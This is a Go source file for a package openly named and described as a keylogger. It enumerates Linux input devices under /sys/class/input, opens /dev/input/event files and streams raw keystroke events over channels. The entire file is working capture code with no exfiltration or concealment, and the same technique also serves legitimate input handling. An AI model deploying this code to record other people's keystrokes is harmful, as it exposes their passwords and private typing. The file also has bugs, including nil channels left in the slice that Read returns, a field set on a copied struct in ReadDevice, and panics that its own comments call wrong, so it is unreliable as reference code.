// Package keylogger is a simple 0 dependency keylogger package
package keylogger

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

const (
	inputPath  = "/sys/class/input/event%d/device/name"
	deviceFile = "/dev/input/event%d"
)

// KeyLogger keeps a reference to the InputDevices that it's listening to.
type KeyLogger struct {
	inputDevices []*InputDevice
}

// NewKeyLogger creates a new keylogger for a device, based on it's name.
func NewKeyLogger(deviceName string) *KeyLogger {
	devs := ScanDevices(deviceName)
	return &KeyLogger{
		inputDevices: devs,
	}
}

// GetDevices returns the devices that have been found
func (kl *KeyLogger) GetDevices() []*InputDevice {
	return kl.inputDevices
}

// ScanDevices gets the desired input device, or returns all of them if no device name is sent.
func ScanDevices(deviceName string) []*InputDevice {
	var devs []*InputDevice
	deviceName = strings.ToLower(deviceName)

	for i := 0; i < 255; i++ {
		// TODO check if file exists first
		buff, err := ioutil.ReadFile(fmt.Sprintf(inputPath, i))
		if err != nil {
			// TODO handle this error better
			break
		}
		dev := newInputDevice(buff, i)

		if deviceName == "" {
			devs = append(devs, dev)
			continue
		}

		contains := strings.Contains(strings.ToLower(string(buff)), deviceName)
		if deviceName == dev.Name || contains {
			devs = append(devs, dev)
		}
	}

	return devs
}

// ReadDevice reads a device and returns what was read or an error.
func ReadDevice(d InputDevice) (e InputEvent, err error) {
	// If this device's file isn't open for reading yet, open it.
	if d.File == nil {
		d.File, err = os.Open(fmt.Sprintf(deviceFile, d.ID))
		if err != nil {
			d.File = nil
			return
		}
	}

	b := make([]byte, eventSize)

	n, err := d.File.Read(b)
	if err != nil {
		d.File.Close()
		return e, err
	}

	if n <= 0 {
		return e, nil
	}

	if err := binary.Read(bytes.NewBuffer(b), binary.LittleEndian, &e); err != nil {
		d.File.Close()
		return e, err
	}

	return
}

// Read the devices' input events and send them on their respective channels.
func (kl *KeyLogger) Read() ([]chan InputEvent, error) {
	chans := make([]chan InputEvent, len(kl.inputDevices))

	for _, dev := range kl.inputDevices {
		fd, err := os.Open(fmt.Sprintf(deviceFile, dev.ID))
		if err != nil {
			return nil, fmt.Errorf("error opening device file: %v", err)
		}
		c := make(chan InputEvent)
		go processEvents(fd, c)
		chans = append(chans, c)
	}
	return chans, nil
}

func processEvents(fd *os.File, c chan InputEvent) {
	tmp := make([]byte, eventSize)
	event := InputEvent{}
	for {
		n, err := fd.Read(tmp)
		if err != nil {
			close(c)
			fd.Close()
			panic(err) // don't think this is right here
		}
		if n <= 0 {
			continue
		}

		if err := binary.Read(bytes.NewBuffer(tmp), binary.LittleEndian, &event); err != nil {
			panic(err) // again, not right
		}

		c <- event
	}
}
